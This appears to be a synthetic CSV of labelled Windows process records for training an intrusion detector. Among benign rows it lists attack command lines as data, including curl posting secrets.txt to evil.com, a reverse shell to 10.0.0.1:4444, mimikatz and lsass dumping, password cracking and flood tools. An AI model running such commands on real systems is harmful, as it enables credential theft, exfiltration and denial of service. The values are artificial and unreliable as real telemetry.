process_name,cmdline,cpu_usage,memory_usage,pid,ppid,has_network_activity,connection_count,is_system_user,label
Teams.exe,Teams.exe,12.288635356078686,8.141067415015161,13072,6567,0,1,0,normal
java.exe,java.exe,56.17432989885847,23.728519919642686,20084,3987,0,11,0,normal
services.exe,services.exe,0.40530193161121675,0.8852117141919913,51832,5567,1,15,0,normal
System Idle Process,System Idle Process,96.45962253456602,0.05557521181071809,14250,8143,0,3,0,normal
git.exe,git.exe,21.325630588256978,4.3013487589898105,42656,4234,0,12,0,normal
git.exe,git.exe,24.635402109564563,1.2496836845854884,42559,4186,1,5,0,normal
procdump.exe,procdump.exe -ma lsass.exe lsass.dmp,30.064616746928543,11.407309390165597,48918,9773,0,9,0,privilege_escalation
stress.exe,stress.exe --cpu 16 --flood,99.24168113594973,19.1664905141023,23340,7148,1,642,0,ddos
java.exe,java.exe,71.01686852811943,12.22262833175791,24095,4380,0,3,0,normal
svchost.exe,svchost.exe,13.722294316603914,0.24259513334409363,1019,7185,0,10,0,normal
hping.exe,hping.exe --flood -p 80 target.com,91.13237895090379,23.081325063823055,58409,3023,1,884,0,ddos
webpack.exe,webpack.exe,94.40661496175208,6.12250279833361,33511,782,0,8,0,normal
wsl.exe,wsl.exe,5.541699296054664,4.616192991346588,37682,8416,0,14,0,normal
lsass.exe,lsass.exe,1.7464237739978943,0.5481663751348582,2921,235,0,8,1,normal
powershell.exe,powershell.exe,12.71161794578618,4.025470755311602,11753,4527,1,15,0,normal
chrome.exe,chrome.exe,19.21842741677792,15.578517770304806,62025,2461,0,2,0,normal
tsc.exe,tsc.exe,50.400410998574415,9.885493593507292,3315,6282,0,7,0,normal
csrss.exe,csrss.exe,1.7910534482134226,0.7483115653873749,54827,8190,0,9,0,normal
lsass.exe,lsass.exe,0.3411058134060879,0.889244736747269,43272,8646,0,13,0,normal
backdoor.exe,backdoor.exe --persist,23.891963245715367,10.951485224633164,41343,2892,0,7,0,malware
WindowsTerminal.exe,WindowsTerminal.exe,10.532429306860205,5.180749949209517,62189,3318,1,12,1,normal
services.exe,services.exe,0.7698247222548307,0.2312848676323906,8370,7394,0,10,1,normal
loic.exe,loic.exe --target 192.168.1.1,94.09370559132556,27.652707717103095,10633,4229,1,1146,0,ddos
Code.exe,Code.exe,44.51981696503821,6.344796481964034,32894,4036,0,8,0,normal
Slack.exe,Slack.exe,7.769566806462199,7.705604704755152,51938,5877,0,3,0,normal
wsl.exe,wsl.exe,37.233270684647984,8.331990484998764,3417,8566,0,9,0,normal
Code.exe,Code.exe,43.94573794913804,9.479203583815249,4213,8506,0,9,1,normal
npm.exe,npm.exe,79.80109067469799,10.921448020201444,64703,1357,0,15,0,normal
cmd.exe,cmd.exe,2.8740038405556803,0.20266280200586212,20464,4497,0,9,1,normal
git.exe,git.exe,41.256754698144356,3.614872440426423,18523,6749,0,3,0,normal
hping.exe,hping.exe --flood -p 80 target.com,86.89600991511938,9.62750077102032,16512,4249,1,2458,0,ddos
System Idle Process,System Idle Process,96.28523114271039,0.02307273417140413,50869,6075,1,3,0,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,36.66958192853682,16.061971729237765,11481,6232,1,19,0,data_exfiltration
juicypotato.exe,juicypotato.exe -l 1337 -p cmd.exe,25.856850735418018,27.6727047545632,1012,6026,0,13,0,privilege_escalation
scvhost.exe,scvhost.exe,22.36712808210251,23.112468948248683,3492,240,0,12,0,malware
cmd.exe,cmd.exe,12.972270534637666,0.23249124715305589,27512,1088,0,8,0,normal
devenv.exe,devenv.exe,1.72184037409446,22.83387367943569,42349,4375,0,11,0,normal
bash.exe,bash.exe,27.173745478638025,3.601098175064864,33382,873,0,7,0,normal
hping.exe,hping.exe --flood -p 80 target.com,90.09789348900017,21.007844837622994,48030,8630,1,3276,0,ddos
hping.exe,hping.exe --flood -p 80 target.com,83.00747234066851,10.273375442014807,2753,6276,1,3245,0,ddos
java.exe,java.exe,83.77425511332243,11.217415806083647,19576,5668,0,9,0,normal
python.exe,python.exe,61.78247311974925,29.519466143242155,44177,8418,0,10,0,normal
System Idle Process,System Idle Process,97.982668866907,0.07459380294343103,21057,2348,0,9,0,normal
node.exe,node.exe,51.590265044134775,17.795829325855646,14899,9321,0,15,1,normal
bash.exe,bash.exe,45.25137018370605,3.322849006555214,28027,7132,1,2,0,normal
MsMpEng.exe,MsMpEng.exe,22.73196272176446,3.3352857970860166,14057,6456,1,11,0,normal
services.exe,services.exe,1.5374636471863286,0.9898996450235017,57367,6201,0,13,1,normal
powershell.exe,powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAA=,24.86457408198952,14.984555997419772,38019,3273,0,2,0,privilege_escalation
services.exe,services.exe,1.5026377576224434,0.7521524544970968,58246,2032,0,5,0,normal
git.exe,git.exe,45.65994283235661,2.0448061710732457,43365,7701,0,9,1,normal
msedge.exe,msedge.exe,33.10246729891327,14.275359552474859,12624,8018,0,7,0,normal
hping.exe,hping.exe --flood -p 80 target.com,90.23636118876372,21.88516629267971,19339,2971,1,4116,0,ddos
msedge.exe,msedge.exe,44.22737297623487,2.526718491938071,55808,5006,0,13,0,normal
node.exe,node.exe,15.98689884990332,3.9784772938606716,52457,9102,0,14,1,normal
explorer.exe,explorer.exe,6.790362819351428,4.403459603681042,10974,7635,1,10,1,normal
locker.exe,locker.exe --wallet bc1qxy...,67.16137087684166,10.301776065109964,61661,4468,0,16,0,ransomware
wsl.exe,wsl.exe,19.83786383510042,7.0720837032126775,54972,8486,0,1,0,normal
svchost.exe,svchost.exe -connect 185.141.62.123:443,12.81790281577273,29.575689248706293,31141,6551,1,2,0,trojan
services.exe,services.exe,0.8048800671847864,0.576566535218284,45965,5552,0,1,1,normal
wsl.exe,wsl.exe,20.95531772146792,1.0279478563787887,59780,748,0,12,1,normal
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,16.657838845596647,23.3733428464601,8545,3121,1,0,0,data_exfiltration
services.exe,services.exe,0.6563085021418782,0.6954118681762422,13076,6352,0,3,0,normal
csrss.exe,csrss.exe,1.5817487718098353,0.7871592234875003,21203,8721,1,7,1,normal
procdump.exe,procdump.exe -ma lsass.exe lsass.dmp,57.596784009062915,8.647458067082958,50838,876,0,10,0,privilege_escalation
bash.exe,bash.exe,45.673112602792884,1.342991924645411,44463,7161,0,11,0,normal
webpack.exe,webpack.exe,26.68535688176451,6.236008269431094,7061,3706,0,3,0,normal
wsl.exe,wsl.exe,35.042874859795354,5.316743671710485,7946,3452,1,12,1,normal
MsMpEng.exe,MsMpEng.exe,3.5860475883135123,6.055154266577942,51915,8211,0,13,0,normal
msedge.exe,msedge.exe,4.952979798848056,2.238506789991673,38059,5554,1,7,0,normal
psexec.exe,psexec.exe \\target -s cmd.exe,20.405757672639055,29.251741453684758,18894,4493,0,4,0,privilege_escalation
wsl.exe,wsl.exe,7.662148069168239,3.538420360117561,8520,9133,0,8,0,normal
explorer.exe,explorer.exe,5.5223476971183345,3.3663596916573777,5412,2768,0,8,0,normal
Docker Desktop.exe,Docker Desktop.exe,10.527556572967107,8.088617832423516,32191,5402,0,15,0,normal
System Idle Process,System Idle Process,96.4433051511536,0.017031133384762098,46377,8310,0,12,0,normal
explorer.exe,explorer.exe,0.515819313605882,4.289430257359589,44125,4700,1,9,1,normal
wsl.exe,wsl.exe,27.931757869221833,4.482637369662882,45248,4601,1,3,1,normal
docker.exe,docker.exe,38.66512728956318,5.712892100424107,59431,1191,0,12,0,normal
Code.exe,Code.exe,37.93536282477215,12.226179493240476,32635,4433,0,8,0,normal
helper.exe,helper.exe --reverse-shell 10.0.0.1:4444,11.694615654773115,18.55323798688062,11628,8803,0,6,0,trojan
mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,48.97017339948301,9.621391318750995,56080,5677,1,0,0,malware
MsMpEng.exe,MsMpEng.exe,72.87985279693808,6.0752974833046665,11646,596,0,15,1,normal
firefox.exe,firefox.exe,40.76578998870767,11.293343787277196,19209,702,0,15,0,normal
System Idle Process,System Idle Process,80.55569335103858,0.09392421044648053,9551,8740,0,11,0,normal
explorer.exe,explorer.exe,8.30236866961815,4.386187332043317,739,2122,1,6,1,normal
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,19.937036196904966,18.962662335316843,18783,9056,1,10,0,data_exfiltration
devenv.exe,devenv.exe,52.663858735999405,6.231786274524838,7590,8418,1,11,0,normal
mimikatz.exe,mimikatz.exe lsadump::sam,58.37067852662643,15.05256050215576,21376,7888,1,16,0,malware
mimikatz.exe,mimikatz.exe lsadump::sam,45.082937138675945,22.57131356237317,18249,7602,0,19,0,malware
System,System,1.2040944832350902,0.10449125964528622,44792,938,1,10,0,normal
docker.exe,docker.exe,43.04283404099869,7.337743691239105,19054,9385,0,3,0,normal
Code.exe,Code.exe,4.070704398353015,3.3399209021576013,31788,2552,0,4,1,normal
python3.exe,python3.exe,65.99835985501538,29.84449932308432,13864,9570,0,8,1,normal
locker.exe,locker.exe --wallet bc1qxy...,51.0031478882149,5.904900640785838,4584,1623,0,2,0,ransomware
Discord.exe,Discord.exe,17.02072836111574,13.28809093165965,21637,5202,0,8,1,normal
bash.exe,bash.exe,34.70278477893609,1.0928172530725564,26828,149,0,4,0,normal
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,98.76119413223788,21.40355060323036,11898,1912,0,2,0,brute_force
lsass.exe,lsass.exe,0.8762084724940111,0.19423478948481132,8253,8828,0,14,1,normal
docker.exe,docker.exe,11.062868500292506,3.9462453412042007,31991,9406,0,13,0,normal
System,System,3.734213822189073,0.11129421447142845,11987,302,0,4,0,normal
python.exe,python.exe,50.3126792649816,4.019438213129165,58920,8533,0,4,0,normal
svchost.exe,svchost.exe,0.5421074957273414,1.393703607542779,48151,5555,0,2,1,normal
WindowsTerminal.exe,WindowsTerminal.exe,9.914623062088879,4.9512327932473,23451,7514,0,11,0,normal
npm.exe,npm.exe,31.58592677071933,3.8956225438988845,11966,1515,0,3,0,normal
svchost.exe,svchost.exe,13.92478061806324,1.9241368107602788,44297,9134,0,13,0,normal
cryptor.exe,cryptor.exe -aes256 -all,94.84255962084626,18.316009120364804,5817,9107,1,20,0,ransomware
svchost.exe,svchost.exe,4.185606547405004,1.664825995344301,57017,3402,1,1,0,normal
chrome.exe,chrome.exe,54.0496463288131,29.966863305185903,64189,5380,0,1,1,normal
firefox.exe,firefox.exe,45.983378616333745,10.625298712154699,60002,9183,0,10,0,normal
loic.exe,loic.exe --target 192.168.1.1,88.66404248245132,24.127961128328412,2975,1600,1,267,0,ddos
printspoofer.exe,printspoofer.exe -i -c cmd,38.888234478503264,20.174117372816475,23343,7787,1,5,0,privilege_escalation
ftp.exe,ftp.exe -s:script.txt evil-server.com,14.298460527332402,7.97429415513078,17885,343,1,4,0,data_exfiltration
devenv.exe,devenv.exe,20.119675193201704,5.186563211046686,30361,7459,0,2,1,normal
loic.exe,loic.exe --target 192.168.1.1,91.14623166681588,26.433065999494644,528,2021,1,1478,0,ddos
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt,58.03606059040402,24.73221132236074,50309,5796,1,11,0,brute_force
node.exe,node.exe,47.66253831056629,2.7242189166843422,16631,1671,0,1,0,normal
dwm.exe,dwm.exe,13.247725249196215,8.942687333473147,11955,4934,1,2,0,normal
printspoofer.exe,printspoofer.exe -i -c cmd,19.027847889714224,24.087385790450657,25709,6011,1,4,0,privilege_escalation
chrome.exe,chrome.exe,9.144937450265957,5.941143925814375,7991,1357,1,4,0,normal
node.exe,node.exe,44.07182146068765,24.08363353565374,48401,5399,0,8,0,normal
System Idle Process,System Idle Process,95.10004237060684,0.013530757343395173,13323,6027,0,2,0,normal
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt,33.675826077667004,28.709942774864828,3244,4121,1,15,0,brute_force
devenv.exe,devenv.exe,37.31587853389031,15.238201651012666,2484,536,0,7,0,normal
docker.exe,docker.exe,45.07059724280985,6.375376691995921,784,5278,1,14,0,normal
firefox.exe,firefox.exe,14.739807967586412,8.010148042983994,8238,552,0,6,0,normal
Slack.exe,Slack.exe,2.9387656328644374,7.2441191966888985,22643,4345,0,8,0,normal
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,59.37065860895358,12.987005977330691,46991,7608,1,386,0,brute_force
Teams.exe,Teams.exe,10.6668776584843,16.79126182931934,48493,5299,0,2,1,normal
svchost.exe,svchost.exe -connect 185.141.62.123:443,15.70439560105767,20.540893934348436,51320,2568,1,7,0,trojan
chrome_update.exe,chrome_update.exe --no-ui,16.707844552665932,9.31116329535721,51640,2627,0,13,0,trojan
powershell.exe,powershell.exe,16.03817060503826,5.849628436601635,58978,8882,0,4,0,normal
Discord.exe,Discord.exe,11.302722386267877,9.168043859034668,299,3674,0,5,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,4.729097695846485,8.87581969175541,9196,9233,0,3,0,normal
powershell.exe,powershell.exe,44.0557905004938,5.2532138373782225,20778,3173,0,13,0,normal
payload.exe,payload.exe --silent,42.89693003014321,11.075873349829,58558,3147,1,11,0,malware
chrome.exe,chrome.exe,59.721174501839414,15.830847396541284,24299,6520,1,5,0,normal
System Idle Process,System Idle Process,85.23531267276,0.04399581093447609,6439,9840,0,4,0,normal
git.exe,git.exe,40.895555635763984,4.806102911564637,46196,1555,1,1,1,normal
npm.exe,npm.exe,30.25133589922645,9.546324409652742,33046,3242,0,2,0,normal
MsMpEng.exe,MsMpEng.exe,74.25666937223261,2.0769908373429944,42041,6825,0,1,0,normal
svchost.exe,svchost.exe,10.698072929990563,0.20838653971086923,11737,1444,0,15,1,normal
npm.exe,npm.exe,90.22770894250887,3.901411465020336,26323,7927,0,14,0,normal
cryptor.exe,cryptor.exe -aes256 -all,81.9866433790878,8.063586600447602,27760,9247,1,17,0,ransomware
update.exe,update.exe --silent --download http://evil.com/payload,33.83931224929858,8.939893778738874,32410,3422,1,11,0,trojan
encrypt.exe,encrypt.exe --recursive C:\Users,62.768563460511906,18.88530966208443,10189,4527,0,14,0,ransomware
explorer.exe,explorer.exe,8.61592830935163,3.0693169481018674,46842,9609,1,0,0,normal
services.exe,services.exe,1.13465075482785,0.3561089273726983,6571,2376,0,1,0,normal
firefox.exe,firefox.exe,27.586833985367477,8.863505400529416,44009,3385,1,8,1,normal
wsl.exe,wsl.exe,36.16841754387379,3.8709202310332915,55112,112,0,1,0,normal
webpack.exe,webpack.exe,39.88467827335329,16.585133270136907,57712,2626,1,8,1,normal
tsc.exe,tsc.exe,93.73341575828317,9.672735738951955,55586,8019,0,3,0,normal
Teams.exe,Teams.exe,11.876785989514556,5.392324554305439,29221,7544,0,4,1,normal
ransom.exe,ransom.exe --encrypt --payment,81.26659380561632,24.979900404509504,46332,1905,0,7,0,ransomware
SearchIndexer.exe,SearchIndexer.exe,24.795090608611346,2.349186279445727,39201,2103,0,13,1,normal
MsMpEng.exe,MsMpEng.exe,6.4412266783490235,8.095850323754956,34181,5134,1,13,1,normal
msedge.exe,msedge.exe,7.934278876061683,2.4104100904913195,12827,6109,0,13,0,normal
python.exe,python.exe,25.592820189556452,26.188818734256362,31880,8847,0,5,1,normal
node.exe,node.exe,15.936274485819668,20.862508844148152,39104,7187,1,13,1,normal
backdoor.exe,backdoor.exe --persist,14.540114741938,28.863826429581994,4057,2890,0,4,0,malware
chrome_update.exe,chrome_update.exe --no-ui,12.550450491039943,28.741475647722417,29794,7056,1,6,0,trojan
Code.exe,Code.exe,45.269508801430646,12.14788599540079,4991,3724,1,5,0,normal
winpeas.exe,winpeas.exe,51.48474551406461,28.39609895463947,8722,1514,0,10,0,privilege_escalation
Discord.exe,Discord.exe,13.061408015410445,11.246467534232641,59257,1519,0,8,0,normal
SearchIndexer.exe,SearchIndexer.exe,13.658334839665493,2.213640149866214,1335,3212,1,9,1,normal
chrome.exe,chrome.exe,50.699197666741135,16.07570701197671,1666,2663,0,15,0,normal
tsc.exe,tsc.exe,11.591331128603244,5.003202685337149,47977,4339,1,0,0,normal
lsass.exe,lsass.exe,3.617633008070951,0.8482158234829061,47170,2200,0,5,0,normal
mimikatz.exe,mimikatz.exe lsadump::sam,21.024417965403437,24.474286635004546,46523,4767,0,1,0,malware
npm.exe,npm.exe,86.85503006590302,15.986605242412269,58860,4608,1,12,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,16.525479323800656,7.345126149483689,44909,8172,1,6,0,normal
OUTLOOK.EXE,OUTLOOK.EXE,23.291907740004365,6.982549795925191,57175,8726,1,3,1,normal
locker.exe,locker.exe --wallet bc1qxy...,78.6215759203597,10.603576640352596,27147,9882,0,5,0,ransomware
firefox.exe,firefox.exe,43.12972177602956,8.972750684412965,39800,1057,0,12,1,normal
csrss.exe,csrss.exe,0.8346041577968438,0.16589690461539103,45628,5680,0,0,1,normal
ransom.exe,ransom.exe --encrypt --payment,75.02547478403596,16.36683965904138,50579,1798,1,2,0,ransomware
powershell.exe,powershell.exe,32.04979054290554,5.168686558529178,44391,5454,0,8,1,normal
mimikatz.exe,mimikatz.exe lsadump::sam,28.662610254962924,12.575944228210655,38286,6551,1,7,0,malware
System Idle Process,System Idle Process,93.83315965509298,0.003898389444669692,22581,630,0,6,0,normal
System Idle Process,System Idle Process,97.20276060470492,0.09577352988330307,50226,471,0,7,0,normal
python3.exe,python3.exe,74.4317656075355,9.587966885409383,6446,4714,0,3,0,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,41.87452260376483,12.811908330188475,16544,9529,0,3,0,data_exfiltration
payload.exe,payload.exe --silent,50.138589730729215,21.333180710338016,29792,4893,0,19,0,malware
ftp.exe,ftp.exe -s:script.txt evil-server.com,24.75998185880719,26.36500834106978,38755,564,1,12,0,data_exfiltration
Teams.exe,Teams.exe,8.437174565382557,16.738371871670903,50042,7855,0,2,0,normal
System,System,2.809934771245652,0.4220174544696638,22384,5184,0,8,1,normal
dwm.exe,dwm.exe,21.48747656728366,5.413705704624973,31733,4226,0,6,0,normal
Slack.exe,Slack.exe,13.063346808839368,7.117703752621226,44124,3253,0,14,0,normal
OUTLOOK.EXE,OUTLOOK.EXE,15.473052449977532,10.645995870055934,38092,4855,1,4,0,normal
msedge.exe,msedge.exe,52.08590765048047,24.221738151522388,64082,6706,0,1,1,normal
Docker Desktop.exe,Docker Desktop.exe,26.78454925139212,4.905357568089798,6839,686,0,2,1,normal
backdoor.exe,backdoor.exe --persist,6.968431030296442,27.043597726779886,54530,293,0,16,0,malware
ransom.exe,ransom.exe --encrypt --payment,82.06303695906723,17.203319898487536,25330,5297,1,17,0,ransomware
Code.exe,Code.exe,42.19293713298195,7.108571178967445,42213,9678,1,2,0,normal
webpack.exe,webpack.exe,28.59453993720651,14.801045811729281,43823,2486,0,12,0,normal
MSBuild.exe,MSBuild.exe,80.65128941886346,10.420764862503058,19962,4438,0,9,1,normal
hping.exe,hping.exe --flood -p 80 target.com,96.99910042613833,19.150746729830843,24199,2207,1,2087,0,ddos
MsMpEng.exe,MsMpEng.exe,63.743744539060515,8.157008669651038,20726,3557,0,7,1,normal
svchost.exe,svchost.exe,2.2293511313690715,2.6808348976506267,16700,2346,1,12,0,normal
csrss.exe,csrss.exe,2.372473602732163,0.8437047357195296,49369,2880,0,12,0,normal
hping.exe,hping.exe --flood -p 80 target.com,87.40711643797125,7.706054968754995,2828,4014,1,3271,0,ddos
java.exe,java.exe,93.3161357668287,13.437056600981135,17117,3286,0,1,1,normal
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,67.4077983410777,17.31334230065604,25340,2937,1,345,0,brute_force
encrypt.exe,encrypt.exe --recursive C:\Users,75.95390875562629,19.804936252685316,64750,2294,1,4,0,ransomware
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,6.1808791144611845,10.859698517744857,2890,5729,1,12,0,data_exfiltration
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,37.013374719949795,11.115428588683825,56783,6913,1,361,0,brute_force
svchost.exe,svchost.exe,13.075424264326664,1.8765609134152812,34896,5204,0,6,1,normal
SearchIndexer.exe,SearchIndexer.exe,4.659681198761851,3.031601587403586,7609,164,1,14,0,normal
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,88.14507494806053,16.28151044548498,20516,3028,0,15,0,brute_force
